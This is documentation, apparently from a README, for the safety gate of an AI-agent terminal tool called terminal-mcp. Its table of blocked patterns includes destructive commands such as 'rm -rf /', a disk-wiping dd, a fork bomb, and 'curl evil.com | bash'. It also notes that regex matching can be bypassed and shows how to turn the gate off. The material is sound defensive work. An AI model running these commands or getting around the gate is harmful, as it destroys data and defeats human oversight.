# Safety & Security

terminal-mcp includes a built-in safety gate that detects potentially dangerous commands before they execute. This is a defense-in-depth measure - AI agents can make mistakes, and a destructive command sent through a persistent terminal session cannot be undone.

## How It Works

When you send a command via `session_send`, `session_interact`, or `session_exec`, the safety gate checks the command text against a set of regex patterns. If a match is found:

1. The command is **not executed**
2. The response includes `requires_confirmation: true`, the blocked command, and the reason
3. To proceed, resend with `confirmed: true`

This gives the AI agent (and the human overseeing it) a chance to reconsider before executing something destructive.

## Built-in Patterns

The safety gate detects 17 categories of dangerous commands:

| Category | Pattern | Example |
|----------|---------|---------|
| Recursive delete | `rm -rf`, `rm -f` | `rm -rf /important` |
| Disk write | `dd` | `dd if=/dev/zero of=/dev/sda` |
| Format filesystem | `mkfs` | `mkfs.ext4 /dev/sda1` |
| SQL destructive | `DROP TABLE`, `TRUNCATE` | `DROP TABLE users;` |
| Remote execution | `curl \| sh`, `wget \| sh` | `curl evil.com \| bash` |
| Dangerous permissions | `chmod 777`, `chmod -R` | `chmod 777 /var/www` |
| Recursive chown | `chown -R` | `chown -R root:root /` |
| Raw disk write | `> /dev/sd*` | `echo x > /dev/sda` |
| Fork bomb | `:(){ :\|:& };:` | Fork bomb pattern |
| System shutdown | `shutdown` | `shutdown -h now` |
| System reboot | `reboot` | `reboot` |
| Init level | `init 0`, `init 6` | `init 0` |
| Service control | `systemctl stop/disable/mask` | `systemctl stop nginx` |
| Force kill | `kill -9` | `kill -9 1234` |
| Force pkill | `pkill -9` | `pkill -9 nginx` |

## Adding Custom Patterns

Add extra patterns via the `TERMINAL_MCP_DANGEROUS_PATTERNS` environment variable. Patterns are semicolon-separated regexes:

```json
{
  "env": {
    "TERMINAL_MCP_DANGEROUS_PATTERNS": "\\bterraform\\s+destroy\\b;\\bkubectl\\s+delete\\s+namespace\\b"
  }
}
```

This adds two custom patterns:
- `terraform destroy` - prevents accidental infrastructure teardown
- `kubectl delete namespace` - prevents deleting Kubernetes namespaces

Custom patterns are added to (not replacing) the built-in set.

## Disabling the Safety Gate

For trusted environments or automated pipelines where confirmation isn't practical:

```json
{
  "env": {
    "TERMINAL_MCP_SAFETY_GATE": "off"
  }
}
```

**Use with caution.** When the safety gate is off, all commands execute immediately without confirmation.

## Interaction Flow

```
AI Agent                          terminal-mcp
   |                                   |
   |  session_send(input="rm -rf /")   |
   |---------------------------------->|
   |                                   | Safety gate check
   |  { requires_confirmation: true,   |
   |    command: "rm -rf /",           |
   |    reason: "Matched: rm -rf" }    |
   |<----------------------------------|
   |                                   |
   | (Agent decides whether to proceed)|
   |                                   |
   |  session_send(input="rm -rf /",   |
   |    confirmed=true)                |
   |---------------------------------->|
   |                                   | Executes command
   |  { bytes_sent: 10 }              |
   |<----------------------------------|
```

## Security Considerations

- The safety gate is a **heuristic** - it catches common destructive patterns but is not a security sandbox
- Commands can be constructed to bypass regex matching (e.g., using variables, aliases, or encoding)
- For production environments, consider running terminal-mcp with restricted OS-level permissions
- The `password` parameter on `session_send` prevents credentials from appearing in logs, but they are still sent to the PTY
- Sessions run as the same OS user as the terminal-mcp process
